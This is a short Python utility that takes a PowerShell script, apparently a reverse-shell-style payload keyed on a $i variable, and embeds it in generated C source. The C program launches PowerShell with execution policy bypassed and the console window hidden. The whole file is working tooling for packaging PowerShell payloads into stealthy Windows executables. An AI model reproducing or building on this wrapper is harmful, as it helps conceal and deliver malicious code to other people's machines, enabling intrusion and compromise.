import re

# Function to modify the $i variable in the input PowerShell script
def modify_script(input_string):
    # Extract the value of $i from the input string
    i_value = re.search(r"\$i='(.*?)';", input_string).group(1)

    # Remove the $i variable declaration
    modified_string = re.sub(r"\$i='.*?';", "", input_string)
    
    # Replace all occurrences of $i with its actual value
    modified_string = re.sub(r"\$i", f"'{i_value}'", modified_string)

    # Replace double quotes with single quotes
    modified_string = modified_string.replace('"', "'")

    return modified_string

# Function to save the C language program to a file
def save_c_program(c_program, file_name):
    with open(file_name, 'w') as file:
        file.write(c_program)
    print(f"C program saved as {file_name}")

# Main function
def main():
    # Prompt the user for the input PowerShell script
    input_string = input("Please enter the PowerShell script input: ")

    # Modify the PowerShell script
    modified_script = modify_script(input_string)

    # C program content with the modified PowerShell script embedded
    c_program = f'''#include <stdio.h>
#include <windows.h>

int main() {{
    // PowerShell command to execute the script
    const char* command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
                          "\\"{modified_script}\\"";

    // Set up the STARTUPINFO structure for a hidden window
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the console window

    ZeroMemory(&pi, sizeof(pi));

    // Create the hidden process
    if (!CreateProcess(NULL,   // No module name (use command line)
                       (LPSTR)command, // Command line
                       NULL,           // Process handle not inheritable
                       NULL,           // Thread handle not inheritable
                       FALSE,          // Set handle inheritance to FALSE
                       CREATE_NO_WINDOW, // Hide the window
                       NULL,           // Use parent's environment block
                       NULL,           // Use parent's starting directory 
                       &si,            // Pointer to STARTUPINFO structure
                       &pi)            // Pointer to PROCESS_INFORMATION structure
    ) {{
        fprintf(stderr, "CreateProcess failed (%d).\\n", GetLastError());
        return 1;
    }}

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}}
'''

    # Take the file name as input from the user
    file_name = input("Enter the file name to save the C program (e.g., windows_process.c): ")

    # Save the C program to a file in the current directory
    save_c_program(c_program, file_name)

# Run the main function
if __name__ == "__main__":
    main()
